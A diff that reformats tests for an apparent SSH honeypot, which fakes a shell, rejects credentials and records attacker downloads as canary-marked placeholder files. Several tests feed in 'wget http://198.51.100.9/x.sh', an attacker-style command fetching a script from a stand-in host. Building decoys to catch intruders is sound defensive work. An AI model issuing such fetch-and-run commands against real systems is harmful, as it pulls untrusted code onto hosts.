@@ -9,10 +9,10 @@ import pytest
 from services.decoy.fakefs import FakeFilesystem
 from services.decoy.session import CREDENTIAL_REJECTED, DecoySession
 from services.decoy.ssh_decoy import (
+    _SIMULATED_CONTENT_MARKER,
     DECOY_SERVICE_NAME,
     _DecoyServerInterface,
     _DecoyShell,
-    _SIMULATED_CONTENT_MARKER,
     execute_command,
 )
 
@@ -103,7 +103,9 @@ def test_only_password_auth_is_allowed(canary):
 
 def test_unknown_command_fails_like_bash():
     session = _session()
-    out, cwd = execute_command(FakeFilesystem(), session, "/root", "definitelynotreal --flag")
+    out, cwd = execute_command(
+        FakeFilesystem(), session, "/root", "definitelynotreal --flag"
+    )
     assert out == "bash: definitelynotreal: command not found"
     assert cwd == "/root"
 
@@ -138,7 +140,9 @@ def test_empty_and_whitespace_commands_are_noops():
 
 def test_wget_simulates_download_and_records_marked_file():
     session = _session()
-    out, _ = execute_command(FakeFilesystem(), session, "/root", "wget http://198.51.100.9/x.sh")
+    out, _ = execute_command(
+        FakeFilesystem(), session, "/root", "wget http://198.51.100.9/x.sh"
+    )
     assert "saved" in out
     (dropped,) = session.build_payload()["files_dropped"]
     assert dropped["name"] == "x.sh"
@@ -157,7 +161,9 @@ def test_simulated_download_content_is_canary_marked():
     session = _session()
     _simulate_download(session, "http://198.51.100.9/x.sh", now="2026-10-09 20:00")
     (dropped,) = session.build_payload()["files_dropped"]
-    content = f"#!/bin/sh\n# {_SIMULATED_CONTENT_MARKER}: http://198.51.100.9/x.sh\nexit 0\n"
+    content = (
+        f"#!/bin/sh\n# {_SIMULATED_CONTENT_MARKER}: http://198.51.100.9/x.sh\nexit 0\n"
+    )
     assert dropped["sha256"] == hashlib.sha256(content.encode("utf-8")).hexdigest()
 
 
